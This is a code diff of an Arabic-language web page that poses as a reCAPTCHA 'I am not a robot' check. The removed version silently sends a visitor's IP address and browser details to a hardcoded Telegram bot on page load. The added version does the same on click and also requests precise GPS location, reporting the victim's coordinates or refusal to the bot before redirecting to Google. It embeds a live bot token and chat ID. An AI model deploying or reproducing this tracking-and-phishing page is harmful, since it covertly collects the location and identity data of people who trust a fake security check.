@@ -1,36 +1,77 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Loading...</title></head>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>التحقق من الأمان</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 10px rgba(0,0,0,0.05); width: 300px; }
+        .checkbox-container { display: flex; align-items: center; cursor: pointer; }
+        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 15px; position: relative; }
+        .checkbox:hover { border-color: #b2b2b2; }
+        .text { font-size: 14px; color: #555; font-weight: 500; }
+        .logo { margin-right: auto; text-align: center; }
+        .logo img { width: 35px; }
+        .logo p { font-size: 10px; margin: 0; color: #9b9b9b; }
+        #loader { display: none; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
 <body>
-    <script>
-        const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8";
-        const chatId = "1149386368";
 
-        async function send() {
-            try {
-                // جلب الـ IP
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                
-                // تجهيز الرسالة
-                const text = `🚀 تم اصطياد هدف جديد!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n🔍 المتصفح: ${navigator.userAgent}`;
+<div class="captcha-box" onclick="startCheck()">
+    <div class="checkbox-container">
+        <div id="check-mark" class="checkbox"></div>
+        <div id="loader"></div>
+        <div class="text">أنا لست برنامج روبوت</div>
+        <div class="logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+            <p>الخصوصية - البنود</p>
+        </div>
+    </div>
+</div>
 
-                // الإرسال عبر رابط مباشر (طريقة لا تُهزم)
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-                
-                // فتح الرابط في الخلفية وإغلاقه فوراً
-                const img = new Image();
-                img.src = url;
-                
-                // الانتظار قليلاً للتأكد من الإرسال ثم التحويل
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 1000);
-            } catch (e) {
-                window.location.href = "https://www.google.com";
-            }
+<script>
+    const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8";
+    const chatId = "1149386368";
+
+    async function startCheck() {
+        document.getElementById('check-mark').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        // 1. جلب البيانات الأساسية (IP) بدون استئذان
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const d = await ipRes.json();
+            sendToTelegram(`🌐 **دخول جديد**\nIP: ${d.ip}\nالدولة: ${d.country_name}\nالمدينة: ${d.city}`);
+        } catch(e) {}
+
+        // 2. طلب الموقع الدقيق (هنا تظهر رسالة السماح)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToTelegram(`🎯 **تم تحديد الموقع بدقة (GPS):**\n${mapLink}`);
+                finish();
+            }, (err) => {
+                sendToTelegram("❌ الضحية رفض إعطاء إذن الموقع الدقيق.");
+                finish();
+            });
+        } else {
+            finish();
         }
-        send();
-    </script>
+    }
+
+    function sendToTelegram(msg) {
+        new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    }
+
+    function finish() {
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 1000);
+    }
+</script>
+
 </body>
 </html>
